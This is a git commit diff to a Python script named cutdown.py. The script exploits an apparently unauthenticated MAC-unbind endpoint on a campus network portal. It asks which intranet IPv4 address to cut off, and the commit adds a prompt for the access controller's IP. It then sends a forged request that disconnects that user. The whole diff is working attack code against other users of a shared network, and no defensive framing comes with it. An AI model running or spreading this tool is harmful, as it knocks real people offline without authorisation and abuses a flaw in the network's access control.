cfbdc67ff33f42448253e89d82b17f1f527faba3
Zaxk1337 <164832393+Zaxk1337@users.noreply.github.com>
2024-06-01 22:20:50 +0800

    Update cutdown.py

--- cutdown.py
+++ cutdown.py
@@ -14,15 +14,14 @@ def ip_to_int(ip_address):
     # 计算整数值
     return (a << 24) + (b << 16) + (c << 8) + d
 
-def cutdown(ipint):
+def cutdown(ipint,acip):
     headers = {
         "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
         "Accept-Language": "en-US,en;q=0.5",
         "Accept-Encoding": "gzip, deflate, br",
         "Accept": "*/*",
-        "Referer": "http://192.168.10.154/"
     }
-    r = requests.get(f"http://192.168.10.154:801/eportal/portal/mac/unbind?wlan_user_mac=000000000000&wlan_user_ip={ipint}",headers=headers)
+    r = requests.get(f"http://{acip}:801/eportal/portal/mac/unbind?wlan_user_mac=000000000000&wlan_user_ip={ipint}",headers=headers)
     print("[+] Sending Request....")
     if r.status_code == 200:
       print(f"[+] The ip Address {int_to_ip(ipint)} Now has been shutdown.")
@@ -32,5 +31,6 @@ def cutdown(ipint):
 
 if __name__ == "__main__":
     ipAddress = input("想断谁网?(内网ipv4地址):")
+    acip = input("请输入校园网接入ip地址:")
     print(f"[*] Target:{ipAddress}")
-    cutdown(ip_to_int(ipAddress))
+    cutdown(ip_to_int(ipAddress),acip)
